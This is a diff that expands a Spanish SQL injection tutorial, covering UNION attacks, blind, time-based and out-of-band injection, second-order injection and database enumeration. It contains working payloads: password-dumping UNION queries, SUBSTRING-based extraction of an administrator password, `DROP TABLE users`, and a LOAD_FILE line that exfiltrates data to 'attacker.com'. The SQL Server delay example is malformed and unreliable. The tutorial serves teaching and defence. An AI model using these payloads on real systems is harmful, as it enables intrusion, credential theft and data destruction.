@@ -41,29 +41,56 @@ Aunque la mayoría de las inyecciones SQL ocurren en la cláusula `WHERE` de una
 
 ### Recuperación de datos ocultos
 
-Ejemplo de URL vulnerable:
+Imagina una aplicación de compras que muestra productos en diferentes categorías. Cuando el usuario hace clic en la categoría "Regalos" (Gifts), su navegador solicita la siguiente URL:
 
 ```
 https://insecure-website.com/products?category=Gifts
 ```
 
-Consulta SQL ejecutada por la aplicación:
+Esto provoca que la aplicación ejecute la siguiente consulta SQL para recuperar los detalles de los productos relevantes desde la base de datos:
 
-```
+```sql
 SELECT * FROM products WHERE category = 'Gifts' AND released = 1;
 ```
 
-Ataque para ver todos los productos, incluidos los no liberados:
+Esta consulta solicita a la base de datos que devuelva:
+
+* Todos los detalles (`*`)
+* De la tabla `products`
+* Donde la categoría es `'Gifts'`
+* Y `released = 1` (se usa para ocultar productos no publicados, suponiendo que los productos no publicados tienen `released = 0`).
+
+La aplicación no implementa ninguna defensa contra ataques de inyección SQL. Esto permite que un atacante manipule la consulta enviando una URL maliciosa como la siguiente:
 
 ```
 https://insecure-website.com/products?category=Gifts'--
 ```
 
-Esto convierte la consulta en:
+Esto generaría la siguiente consulta SQL en el backend:
 
-```
+```sql
 SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1;
 ```
+
+El `--` es un indicador de comentario en SQL, lo que significa que el resto de la consulta se trata como un comentario y se ignora. En este caso, la condición `AND released = 1` queda eliminada, permitiendo que se muestren todos los productos, incluso los que aún no han sido publicados.
+
+Un atacante también podría modificar la URL para ver todos los productos de la base de datos, incluso aquellos de categorías desconocidas:
+
+```
+https://insecure-website.com/products?category=Gifts'+OR+1=1--
+```
+
+Esto generaría la siguiente consulta:
+
+```sql
+SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1;
+```
+
+La condición `OR 1=1` siempre es verdadera, por lo que la consulta devuelve todos los productos de la base de datos, sin importar su categoría o estado de publicación.
+
+Si bien inyectar `OR 1=1` parece inofensivo cuando se usa en consultas SELECT, muchas aplicaciones reutilizan los datos de una solicitud en múltiples consultas SQL.
+
+Si esta inyección alcanza una consulta `UPDATE` o `DELETE`, podría causar la modificación o eliminación masiva de datos.
 
 ### Bypass de autenticación
 
@@ -108,35 +135,163 @@ SELECT name, description FROM products WHERE category = '' UNION SELECT username
 
 ### Inyección SQL ciega (Blind SQL Injection)
 
-Cuando la aplicación no devuelve errores ni datos visibles, se pueden usar:
+Muchas vulnerabilidades de inyección SQL son **ciegas**. Esto significa que la aplicación **no devuelve los resultados de la consulta SQL ni detalles de errores de la base de datos** en sus respuestas.
 
-* **Pruebas booleanas**: Alterar la lógica de la consulta y observar cambios en la respuesta.
-* **Retrasos por tiempo**: Inyectar consultas que introduzcan pausas (`SLEEP(5)`) y medir la respuesta.
-* **Técnicas OAST**: Exfiltración de datos mediante DNS u otros canales fuera de banda.
+Aunque estas vulnerabilidades pueden ser más difíciles de explotar, aún es posible acceder a datos no autorizados mediante técnicas avanzadas.
+
+Dependiendo del tipo de vulnerabilidad y de la base de datos, se pueden emplear diversas estrategias:
+
+#### **Manipulación de la lógica de la consulta**
+
+Se puede modificar la consulta para generar **una diferencia detectable** en la respuesta de la aplicación, dependiendo de la veracidad de una condición.
+
+Ejemplo: **inyectar una condición en una lógica booleana**
+
+```sql
+' OR 1=1 --
+```
+
+O forzar un **error condicional**, como una división por cero:
+
+```sql
+' OR 1=1 AND 1/0=1 --
+```
+
+Si la aplicación maneja errores de forma diferente a una respuesta normal, se puede inferir información sobre la base de datos.
+
+#### **Retrasos en la ejecución de la consulta (Time-Based SQL Injection)**
+
+Si la aplicación no muestra errores ni diferencias en la respuesta, se puede inyectar un **retraso intencionado** en la consulta y medir el tiempo de respuesta.
+
+Ejemplo para **MySQL** (usando `SLEEP()`):
+
+<pre class="language-sql"><code class="lang-sql"><strong>' OR IF(1=1, SLEEP(5), 0) --
+</strong></code></pre>
+
+Ejemplo para **SQL Server** (usando `WAITFOR DELAY`):
+
+```sql
+' OR IF(1=1) WAITFOR DELAY '0:0:5' --
+```
+
+Si la respuesta tarda más de lo normal, significa que la condición inyectada se evaluó como `TRUE`, permitiendo extraer información bit a bit.
+
+#### **Interacciones fuera de banda (Out-of-Band, OAST)**
+
+Cuando las técnicas anteriores no funcionan, se pueden utilizar canales externos para exfiltrar datos.
+
+Por ejemplo, se puede hacer que la base de datos realice una **búsqueda DNS** con los datos robados hacia un dominio controlado por el atacante:
+
+```sql
+' UNION SELECT LOAD_FILE(CONCAT('\\\\', (SELECT database()), '.attacker.com\\file')) --
+```
+
+Esto permite extraer información sin que la aplicación lo detecte.
 
 ### Inyección SQL de segundo orden (Second-order SQL Injection)
 
-Ocurre cuando un dato inyectado se almacena en la base de datos y posteriormente se usa en una consulta vulnerable. Es peligrosa porque el ataque no se ejecuta inmediatamente.
+Ocurre cuando la aplicación **almacena la entrada del usuario en la base de datos sin vulnerabilidad inmediata**, pero en una solicitud futura la recupera y la usa en una consulta SQL de manera insegura.
+
+Es peligrosa porque los desarrolladores pueden creer que los datos almacenados son **seguros** y no los validan antes de reutilizarlos.
+
+**Un usuario malicioso se registra en la aplicación** con el siguiente nombre:
+
+```
+user'; DROP TABLE users; --
+```
+
+La aplicación maneja correctamente la inserción en la base de datos y almacena el nombre sin ejecutar la inyección.
+
+**En un momento posterior, la aplicación usa ese nombre en una consulta SQL insegura:**
+
+```sql
+SELECT * FROM users WHERE username = 'user'; DROP TABLE users; --';
+```
+
+Aquí, cuando la aplicación usa el nombre almacenado sin validarlo, ejecuta el `DROP TABLE`, eliminando toda la tabla `users`.
 
 ### Examinando la base de datos
 
-Una vez identificada una vulnerabilidad SQLi, se pueden extraer datos de la base de datos:
+Para **explotar** vulnerabilidades de inyección SQL, es fundamental obtener información sobre la base de datos, incluyendo:
 
-*   Para conocer la versión:
+**El tipo y la versión del software de la base de datos.**\
+**Las tablas y columnas que contiene la base de datos.**
 
-    ```
-    SELECT * FROM v$version;  -- Oracle
-    ```
-*   Para listar tablas:
+#### **Consultando el tipo y versión de la base de datos**
 
-    ```
-    SELECT * FROM information_schema.tables;
-    ```
-*   Para listar columnas de una tabla específica:
+Se pueden inyectar consultas específicas para cada proveedor de bases de datos y determinar cuál funciona.
 
-    ```
-    SELECT column_name FROM information_schema.columns WHERE table_name='users';
-    ```
+| **Tipo de Base de Datos**   | **Consulta para obtener la versión** |
+| --------------------------- | ------------------------------------ |
+| Microsoft SQL Server, MySQL | `SELECT @@version`                   |
+| Oracle                      | `SELECT * FROM v$version`            |
+| PostgreSQL                  | `SELECT version()`                   |
+
+Si la aplicación es vulnerable a SQL Injection, se puede intentar:
+
+```sql
+' UNION SELECT @@version--
+```
+
+Si la base de datos es **Microsoft SQL Server**, puede devolver un resultado como este:
+
+```
+Microsoft SQL Server 2016 (SP2) (KB4052908) - 13.0.5026.0 (X64)
+Mar 18 2018 09:11:49
+Standard Edition (64-bit) on Windows Server 2016 Standard 10.0 <X64> (Build 14393: )
+```
+
+Esto confirma que la base de datos es **SQL Server** y revela su versión.
+
+#### **Listando el contenido de la base de datos**
+
+#### Listar las tablas en bases de datos (excepto Oracle)
+
+```sql
+SELECT * FROM information_schema.tables;
+```
+
+Ejemplo de salida:
+
+| TABLE\_CATALOG | TABLE\_SCHEMA | TABLE\_NAME | TABLE\_TYPE |
+| -------------- | ------------- | ----------- | ----------- |
+| MyDatabase     | dbo           | Products    | BASE TABLE  |
+| MyDatabase     | dbo           | Users       | BASE TABLE  |
+| MyDatabase     | dbo           | Feedback    | BASE TABLE  |
+
+Aquí se identifican las tablas **Products, Users y Feedback**.
+
+#### Listar columnas de una tabla específica
+
+```sql
+SELECT * FROM information_schema.columns WHERE table_name = 'Users';
+```
+
+Ejemplo de salida:
+
+| TABLE\_CATALOG | TABLE\_SCHEMA | TABLE\_NAME | COLUMN\_NAME | DATA\_TYPE |
+| -------------- | ------------- | ----------- | ------------ | ---------- |
+| MyDatabase     | dbo           | Users       | UserId       | int        |
+| MyDatabase     | dbo           | Users       | Username     | varchar    |
+| MyDatabase     | dbo           | Users       | Password     | varchar    |
+
+Esto muestra las columnas de la tabla `Users`, incluyendo `UserId`, `Username` y `Password`.
+
+#### **Listando el contenido de una base de datos Oracle**
+
+Oracle no usa `information_schema`, pero se pueden usar otras vistas del sistema:
+
+Listar todas las tablas:
+
+```sql
+SELECT * FROM all_tables;
+```
+
+Listar todas las columnas de una tabla específica:
+
+```sql
+SELECT * FROM all_tab_columns WHERE table_name = 'USERS';
+```
 
 ### Inyección SQL en diferentes contextos
 
@@ -148,6 +303,218 @@ Las inyecciones SQL pueden aparecer en entradas JSON o XML. Ejemplo de SQLi en X
     <storeId>999 &#x53;ELECT * FROM information_schema.tables</storeId>
 </stockCheck>
 ```
+
+## Ataques UNION
+
+Cuando una aplicación es vulnerable a inyección SQL y los resultados de la consulta se devuelven dentro de las respuestas de la aplicación, puedes utilizar la palabra clave `UNION` para recuperar datos de otras tablas dentro de la base de datos. Esto se conoce comúnmente como un ataque de inyección SQL mediante UNION.
+
+La palabra clave `UNION` permite ejecutar una o más consultas `SELECT` adicionales y agregar los resultados a la consulta original. Por ejemplo:
+
+```sql
+SELECT a, b FROM table1 UNION SELECT c, d FROM table2;
+```
+
+Esta consulta SQL devuelve un único conjunto de resultados con dos columnas, que contienen valores de las columnas `a` y `b` en `table1` y de las columnas `c` y `d` en `table2`.
+
+Para que una consulta `UNION` funcione, se deben cumplir dos requisitos clave:
+
+1. Las consultas individuales deben devolver el mismo número de columnas.
+2. Los tipos de datos en cada columna deben ser compatibles entre las consultas individuales.
+
+Para llevar a cabo un ataque de inyección SQL mediante `UNION`, asegúrate de que tu ataque cumpla con estos dos requisitos. Normalmente, esto implica averiguar:
+
+* Cuántas columnas devuelve la consulta original.
+* Qué columnas devueltas por la consulta original tienen un tipo de dato adecuado para contener los resultados de la consulta inyectada.
+
+### Determinación del número de columnas necesarias
+
+Cuando realizas un ataque de inyección SQL mediante `UNION`, hay dos métodos efectivos para determinar cuántas columnas devuelve la consulta original.
+
+Un método consiste en inyectar una serie de cláusulas `ORDER BY` e incrementar el índice de columna especificado hasta que ocurra un error. Por ejemplo, si el punto de inyección está dentro de una cadena entre comillas en la cláusula `WHERE` de la consulta original, enviarías:
+
+```sql
+' ORDER BY 1--
+' ORDER BY 2--
+' ORDER BY 3--
+```
+
+Y así sucesivamente.
+
+Esta serie de cargas útiles modifica la consulta original para ordenar los resultados por diferentes columnas en el conjunto de resultados. La columna en `ORDER BY` se puede especificar por su índice, por lo que no es necesario conocer los nombres de las columnas.
+
+Cuando el índice de columna especificado excede el número real de columnas en el conjunto de resultados, la base de datos devuelve un error, como:
+
+```
+The ORDER BY position number 3 is out of range of the number of items in the select list.
+```
+
+La aplicación podría devolver el error de la base de datos en su respuesta HTTP, emitir una respuesta de error genérica o simplemente no devolver ningún resultado. De cualquier manera, siempre que puedas detectar una diferencia en la respuesta, puedes inferir cuántas columnas se devuelven en la consulta.
+
+Otro método consiste en enviar una serie de cargas útiles `UNION SELECT`, especificando un número diferente de valores `NULL`:
+
+```sql
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+```
+
+Y así sucesivamente.
+
+Si el número de valores `NULL` no coincide con el número de columnas, la base de datos devuelve un error como:
+
+```
+All queries combined using a UNION, INTERSECT or EXCEPT operator must have an equal number of expressions in their target lists.
+```
+
+Usamos `NULL` como valores en la consulta inyectada porque los tipos de datos en cada columna deben ser compatibles entre la consulta original y la inyectada. `NULL` es convertible a cualquier tipo de dato común, lo que maximiza la posibilidad de que la carga útil tenga éxito cuando el número de columnas es correcto.
+
+Al igual que con la técnica `ORDER BY`, la aplicación puede devolver el error de la base de datos en su respuesta HTTP, una respuesta genérica o simplemente no mostrar resultados.
+
+Cuando el número de valores `NULL` coincide con el número de columnas, la base de datos devuelve una fila adicional en el conjunto de resultados, con valores `NULL` en cada columna. El efecto en la respuesta HTTP depende del código de la aplicación. Si tienes suerte, verás contenido adicional en la respuesta, como una fila extra en una tabla HTML.
+
+De lo contrario, los valores `NULL` pueden desencadenar un error diferente, como un `NullPointerException`. En el peor de los casos, la respuesta podría parecer la misma que una respuesta con un número incorrecto de `NULL`, lo que haría que este método fuera ineficaz.
+
+### Sintaxis específica de cada base de datos
+
+En **Oracle**, cada consulta `SELECT` debe usar la palabra clave `FROM` y especificar una tabla válida. Existe una tabla incorporada en Oracle llamada `DUAL`, que se puede usar para este propósito. Por lo tanto, las consultas inyectadas en Oracle deben verse así:
+
+```sql
+' UNION SELECT NULL FROM DUAL--
+```
+
+Las cargas útiles descritas utilizan la secuencia de comentario de doble guion `--` para comentar el resto de la consulta original después del punto de inyección.
+
+En **MySQL**, la secuencia de doble guion `--` debe ir seguida de un espacio. Como alternativa, se puede usar el carácter `#` para indicar un comentario.
+
+Para más detalles sobre la sintaxis específica de cada base de datos, consulta la **SQL Injection Cheat Sheet**.
+
+### Encontrando columnas con un tipo de dato útil
+
+Un ataque de inyección SQL mediante `UNION` te permite recuperar los resultados de una consulta inyectada. Los datos interesantes que deseas obtener suelen estar en **forma de cadena de texto**. Esto significa que necesitas encontrar una o más columnas en los resultados de la consulta original cuyo tipo de dato sea compatible con datos de tipo **string**.
+
+Después de determinar el número de columnas requeridas, puedes probar cada columna para verificar si puede contener datos de tipo string. Para hacerlo, envía una serie de cargas útiles `UNION SELECT` colocando un valor de cadena en cada columna, una por una.
+
+Por ejemplo, si la consulta devuelve **cuatro columnas**, puedes probar con:
+
+```sql
+' UNION SELECT 'a',NULL,NULL,NULL--
+' UNION SELECT NULL,'a',NULL,NULL--
+' UNION SELECT NULL,NULL,'a',NULL--
+' UNION SELECT NULL,NULL,NULL,'a'--
+```
+
+Si el tipo de dato de una columna **no es compatible** con datos de tipo string, la consulta inyectada provocará un error en la base de datos, como:
+
+```
+Conversion failed when converting the varchar value 'a' to data type int.
+```
+
+Si **no ocurre un error** y la respuesta de la aplicación contiene algún contenido adicional con el valor de cadena inyectado, entonces la columna correspondiente es adecuada para recuperar datos en formato string.
+
+### Uso de un ataque de inyección SQL mediante UNION para recuperar datos interesantes
+
+Una vez que hayas determinado el número de columnas devueltas por la consulta original y encontrado cuáles columnas pueden contener datos de tipo string, estarás en posición de recuperar datos interesantes.
+
+Supongamos que:
+
+* La consulta original devuelve **dos columnas**, ambas capaces de contener datos de tipo string.
+* El punto de inyección está en una cadena entre comillas dentro de la cláusula `WHERE`.
+* La base de datos contiene una tabla llamada `users` con las columnas `username` y `password`.
+
+En este caso, puedes recuperar el contenido de la tabla `users` enviando la siguiente entrada:
+
+```sql
+' UNION SELECT username, password FROM users--
+```
+
+Para llevar a cabo este ataque, necesitas saber que existe una tabla llamada `users` con dos columnas llamadas `username` y `password`. Sin esta información, tendrías que adivinar los nombres de las tablas y columnas.\
+Todas las bases de datos modernas proporcionan maneras de examinar la estructura de la base de datos y determinar qué tablas y columnas contienen.
+
+### Recuperando múltiples valores dentro de una sola columna
+
+En algunos casos, la consulta en el ejemplo anterior puede devolver solo una columna.
+
+Puedes recuperar múltiples valores dentro de esta columna única concatenando los valores juntos. Puedes incluir un separador para distinguir los valores combinados. Por ejemplo, en **Oracle** podrías enviar la siguiente entrada:
+
+```sql
+' UNION SELECT username || '~' || password FROM users--
+```
+
+Esto utiliza la secuencia de doble barra vertical `||`, que es el operador de concatenación de cadenas en Oracle. La consulta inyectada concatena los valores de los campos `username` y `password`, separados por el carácter `~`.
+
+Los resultados de la consulta contienen todos los nombres de usuario y contraseñas, por ejemplo:
+
+```
+administrator~s3cure
+wiener~peter
+carlos~montoya
+```
+
+Diferentes bases de datos utilizan diferentes sintaxis para realizar la concatenación de cadenas. Para más detalles, consulta la **SQL Injection Cheat Sheet**.
+
+## Inyección SQL Ciega
+
+La inyección SQL ciega ocurre cuando una aplicación es vulnerable a la inyección SQL, pero sus respuestas HTTP no contienen los resultados de la consulta SQL relevante ni los detalles de los errores de base de datos.
+
+Muchas técnicas, como los ataques UNION, no son efectivas con vulnerabilidades de inyección SQL ciega. Esto se debe a que dependen de poder ver los resultados de la consulta inyectada dentro de las respuestas de la aplicación.
+
+Aún es posible explotar la inyección SQL ciega para acceder a datos no autorizados, pero se deben usar técnicas diferentes.
+
+### Explotación de inyección SQL ciega mediante respuestas condicionales
+
+Considera una aplicación que utiliza cookies de seguimiento para recopilar análisis sobre el uso. Las solicitudes a la aplicación incluyen un encabezado de cookie como este:
+
+```
+Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4
+```
+
+Cuando se procesa una solicitud que contiene una cookie `TrackingId`, la aplicación utiliza una consulta SQL para determinar si este es un usuario conocido:
+
+```sql
+SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'
+```
+
+Esta consulta es vulnerable a inyección SQL, pero los resultados de la consulta no se devuelven al usuario. Sin embargo, la aplicación se comporta de manera diferente dependiendo de si la consulta devuelve algún dato. Si envías un `TrackingId` reconocido, la consulta devuelve datos y recibes un mensaje de "Bienvenido de nuevo" en la respuesta.
+
+Este comportamiento es suficiente para poder explotar la vulnerabilidad de inyección SQL ciega. Puedes recuperar información activando respuestas diferentes condicionalmente, dependiendo de una condición inyectada.
+
+Supongamos que se envían dos solicitudes que contienen los siguientes valores de la cookie `TrackingId`:
+
+1. `…xyz' AND '1'='1`
+2. `…xyz' AND '1'='2`
+
+* El primer valor de estas solicitudes hace que la consulta devuelva resultados, porque la condición inyectada `AND '1'='1` es verdadera. Como resultado, se muestra el mensaje "Bienvenido de nuevo".
+* El segundo valor hace que la consulta no devuelva resultados, porque la condición inyectada es falsa. El mensaje "Bienvenido de nuevo" no se muestra.
+
+Esto nos permite determinar la respuesta a cualquier condición inyectada y extraer datos uno a uno.
+
+Supón que existe una tabla llamada `Users` con las columnas `Username` y `Password`, y un usuario llamado `Administrator`. Puedes determinar la contraseña de este usuario enviando una serie de entradas para probar la contraseña, un carácter a la vez.
+
+Para hacerlo, comienza con la siguiente entrada:
+
+```sql
+xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm
+```
+
+Esto devuelve el mensaje "Bienvenido de nuevo", lo que indica que la condición inyectada es verdadera, y por lo tanto, el primer carácter de la contraseña es mayor que `m`.
+
+Luego, envías la siguiente entrada:
+
+```sql
+xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't
+```
+
+Esto no devuelve el mensaje "Bienvenido de nuevo", lo que indica que la condición inyectada es falsa, y por lo tanto, el primer carácter de la contraseña no es mayor que `t`.
+
+Eventualmente, envías la siguiente entrada, que devuelve el mensaje "Bienvenido de nuevo", confirmando que el primer carácter de la contraseña es `s`:
+
+```sql
+xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's
+```
+
+Puedes continuar este proceso para determinar sistemáticamente la contraseña completa del usuario `Administrator`.
+
+> **Nota**: La función `SUBSTRING` se llama `SUBSTR` en algunos tipos de bases de datos. Para más detalles, consulta la **SQL Injection Cheat Sheet**.
 
 ## Cómo Prevenir la Inyección SQL
 
